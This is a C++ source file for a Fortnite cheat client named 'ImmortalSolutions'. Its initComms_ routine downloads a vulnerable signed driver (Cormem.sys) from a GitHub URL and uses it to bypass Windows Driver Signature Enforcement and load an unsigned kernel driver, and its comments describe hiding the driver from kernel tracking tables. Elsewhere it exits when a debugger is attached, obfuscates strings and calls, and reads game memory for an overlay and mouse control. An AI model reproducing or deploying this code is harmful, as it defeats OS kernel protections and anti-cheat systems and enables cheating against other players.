#include "Includes/includes.hpp"
#include "Includes/call.hh"
#include "Dependencies/Fortnite/loop.hpp"
#include "Dependencies/UI/Renderer/c_overlay.h"
#include <tchar.h>
#include <ntstatus.h>
#include "Includes/Definitions/xorst.h"
#include "Includes/Definitions/skcrypt.h"
#include "Includes/Definitions/c_obfuscation.hpp"
#include <thread>
#include <urlmon.h>
#include "auth.hpp"
#include "../usermode/map_driver.hpp"
#include "bytes.h"

// Deterministic device name - hardcoded GUID shared with the driver.
#define DEVICE_GUID_W L"{834d7291-7e88-4c44-ad23-de42d34d7532}"





#pragma comment(lib, "urlmon.lib")





Overlay::DX11Overlay* D11Overlay = nullptr;
bool developer_mode = true;

__declspec(noinline) void log() {

#define LOG printf("success");

}


__declspec(noinline) auto initServer_() -> call::status {

    char title[256];

    sprintf_s(title, _(" "));

    if (developer_mode)
    {
        sprintf_s(title, _(" Immortal | Development Version"));
    };

    (SetConsoleTitleA)(title);

    return call_success;
}

std::uint32_t get_process_id(const wchar_t* process_name) {
    std::uint32_t process_id = 0;

    HANDLE snap_shot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (snap_shot == INVALID_HANDLE_VALUE)

        return process_id;

    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(decltype(entry));

    if (Process32FirstW(snap_shot, &entry) == TRUE) {
        if (_wcsicmp(process_name, entry.szExeFile) == 0) {
            process_id = entry.th32ProcessID;
        }
        else {
            while (Process32NextW(snap_shot, &entry) == TRUE) {
                if (_wcsicmp(process_name, entry.szExeFile) == 0) {
                    process_id = entry.th32ProcessID;
                    break;
                }
            }
        }
    }

    CloseHandle(snap_shot);
    return process_id;
}

__declspec(noinline) auto init_overlay() -> call::status {

    Overlay::DX11Overlay::GetWindow(FindWindow(0, (_("Fortnite  "))));

    auto overlay = D11Overlay->InitOverlay();

    // Anti-throttle: a hidden-window client gets EcoQoS'd by Windows when
    // unfocused (execution speed throttled hard), which starved the cache
    // loop to ~1 pass/6-7s and let one-shot probes latch dead. Opt the whole
    // process out of power throttling and raise priorities.
    struct {
        ULONG Version;
        ULONG ControlMask;
        ULONG StateMask;
    } pt{};
    pt.Version = 1;       // PROCESS_POWER_THROTTLING_CURRENT_VERSION
    pt.ControlMask = 0x1; // PROCESS_POWER_THROTTLING_EXECUTION_SPEED
    pt.StateMask = 0;     // 0 = explicitly DISABLE execution-speed throttling
    SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3 /*ProcessPowerThrottling*/, &pt, sizeof(pt));
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    std::thread([]() {
        obf::set_thread_stealth(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);
        for (;; ) {
            GameCache::cachep();
        }
        }).detach();

    switch (overlay) {
    case 0: {
        break;
    }
    case 1: {

        while (D11Overlay->MainLoop(actor_loop)) {

        }
        break;
    }
    }

    return call_success;
}

void attach()
{
    SPOOF_FUNC;

    {
        while (true)
        {
            for (int i = 0; i < 5; i++) {
                if (IsDebuggerPresent()) {
                    _exit(0);
                }
                Sleep(500);
            }
        }
    }

}



bool DownloadFile(const std::wstring& url, const std::wstring& outputPath) {
    SPOOF_FUNC;
    HRESULT hr = URLDownloadToFileW(NULL, url.c_str(), outputPath.c_str(), 0, NULL);
    return SUCCEEDED(hr);
}


bool ExecuteCommand(const std::wstring& command) {
    SPOOF_FUNC;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    BOOL success = CreateProcessW(NULL, const_cast<LPWSTR>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (success) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return success;
}


bool DeleteFileSafe(const std::wstring& filePath) {
    SPOOF_FUNC;
    return DeleteFileW(filePath.c_str());
}


bool RunInBackground(const std::wstring& command) {
    SPOOF_FUNC;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    std::wstring commandLine = command;

    if (!CreateProcessW(
        NULL,
        &commandLine[0],
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        std::wcerr << L"CreateProcessW failed (" << GetLastError() << L")." << std::endl;
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}


static auto cr3loop() -> void {
    m_vm& device = device_();
    device.cr3_();

    std::this_thread::sleep_for(std::chrono::milliseconds(1));
}

bool is_driver_loaded() {
    // Probe the deterministic device name directly - no uuid.dat dependency.
    std::wstring device_path = L"\\\\.\\" DEVICE_GUID_W;
    HANDLE h = CreateFileW(device_path.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (h && h != INVALID_HANDLE_VALUE) {
        CloseHandle(h);
        return true;
    }
    return false;
}

__declspec(noinline) auto initComms_() -> bool {
    // Check if driver is already loaded
    if (is_driver_loaded()) {
        printf(_("[+] Driver already loaded.\n"));
        return true;
    }

    printf(_("[*] Loading driver...\n"));

    std::string ExploitSys = GenerateRandomFileName(".sys");
    std::string DriverModule = GenerateRandomFileName(".sys");

    std::string LocalDriver = "hujdrv.sys";
    if (GetFileAttributesA(LocalDriver.c_str()) == INVALID_FILE_ATTRIBUTES) {
        LocalDriver = "C:\\Users\\mason\\Downloads\\fanny\\yanny\\usermode\\x64\\Release\\hujdrv\\hujdrv.sys";
    }
    if (!CopyFileA(LocalDriver.c_str(), DriverModule.c_str(), FALSE)) {
        printf(_("[!] Local driver copy failed (%lu).\n"), GetLastError());
        DeleteFileA(DriverModule.c_str());
        return false;
    }

    char full_driver[MAX_PATH] = {};
    GetFullPathNameA(DriverModule.c_str(), MAX_PATH, full_driver, nullptr);
    std::string direct_svc = GenerateRandomString(10);

    // First try direct SCM load of the signed driver so Cormem.sys is never
    // downloaded, loaded, or recorded in MmUnloadedDrivers / PiDDBCacheTable / g_KernelHashBucketList.
    if (load_driver_scm(direct_svc.c_str(), full_driver)) {
        Sleep(300);
        DeleteFileA(DriverModule.c_str());
        if (is_driver_loaded()) {
            printf(_("[+] Signed driver loaded directly via SCM (zero Cormem traces).\n"));
            return true;
        }
    } else {
        unload_driver_scm(direct_svc.c_str());
    }

    // Fallback: download CorMem only if direct SCM load was rejected by DSE
    printf(_("[*] Downloading components...\n"));
    HRESULT hr1 = URLDownloadToFileA(NULL, "https://raw.githubusercontent.com/mrh0ql/vuln/main/Cormem.sys", ExploitSys.c_str(), 0, NULL);
    HRESULT hr2 = S_OK;

    if (FAILED(hr1) || FAILED(hr2)) {
        printf(_("[!] Failed to download driver files.\n"));
        if (FAILED(hr1)) printf(_("[!]   Cormem.sys download failed.\n"));
        if (FAILED(hr2)) printf(_("[!]   Driver download failed.\n"));
        DeleteFileA(ExploitSys.c_str());
        DeleteFileA(DriverModule.c_str());
        return false;
    }

    EncryptFilePath(ExploitSys.c_str());
    EncryptFilePath(DriverModule.c_str());

    // Load driver via DSE bypass using CorMem (direct IOCTL, no DLL)
    windows_service(DriverModule.c_str(), ExploitSys.c_str());

    // Clean up temp files
    Sleep(500);
    DeleteFileA(ExploitSys.c_str());
    DeleteFileA(DriverModule.c_str());

    // Verify driver loaded
    Sleep(1000);
    if (!is_driver_loaded()) {
        printf(_("[!] Driver failed to load.\n"));
        return false;
    }

    printf(_("[+] Driver loaded successfully.\n"));
    return true;
}

int main()
{
    setvbuf(stdout, nullptr, _IONBF, 0); // unbuffered: live log capture over redirected pipes
    SPOOF_FUNC;
    GameCache::Cache cacheInstance;
    //getDaOffsets();

    std::string consoleTitle = skCrypt("ImmortalSolutions | Public").decrypt();
    SetConsoleTitleA(consoleTitle.c_str());

    m_vm& device = device_();

    initServer_();
    // device.init_mouse() moved to after device.init_() opens m_handle

    //name.clear(); ownerid.clear(); secret.clear(); version.clear(); url.clear();

    //KeyAuthApp.init();

    //std::string key;

    //std::cout << E("\n Enter license: ");
    //std::cin >> key;
    //KeyAuthApp.license(key);

    //if (!KeyAuthApp.response.success)
    //{
    //    std::cout << E("\n Status: ") << KeyAuthApp.response.message;
    //    Sleep(1500);
    //    exit(1);
    //}

    //Sleep(2000);


    Sleep(400);
    system("cls");

    // Load driver if not already running
    if (!initComms_()) {
        printf(_("[!] Could not load driver. Run as administrator.\n"));
        system("pause");
        return 1;
    }

    Sleep(400);
    system("cls");

    if (!device.init_())
    {
        printf(_("[!] Could not connect to driver.\n"));
        system("pause");
        return 1;
    }
    device.init_mouse();
    HWND fn_win = NULL;
    printf(_("Please open Fortnite"));
    while (fn_win == NULL) { fn_win = FindWindowA(0, "Fortnite  "); }

    device.m_pid = device.isruning_("FortniteClient-Win64-Shipping.exe");

    device.m_base = device.get_base_address_();

    Sleep(4000);


    printf("Base: 0x%p\n", device.m_base);


    // Retry the handshake: a client force-killed mid-IOCTL can leave the
    // driver's CR3 path momentarily wedged; a fresh client immediately after
    // may race it. Up to 5 attempts, 2s apart, before aborting.
    bool cr3_ok = false;
    for (int attempt = 1; attempt <= 5 && !cr3_ok; ++attempt) {
        if (attempt > 1) {
            printf(_("[*] CR3 handshake retry %d/5...\n"), attempt);
            Sleep(2000);
        }
        cr3_ok = device.cr3_();
    }
    if (!cr3_ok) {
        printf(_("[!] CR3 handshake failed - physical reads will return zeros. Aborting.\n"));
        system("pause");
        return 1;
    }

    va_text = device.m_base;

    system("cls");

    printf(_("Have Fun!"));


    init_overlay();

}

//this is binarylover propriety:) Nonono mine
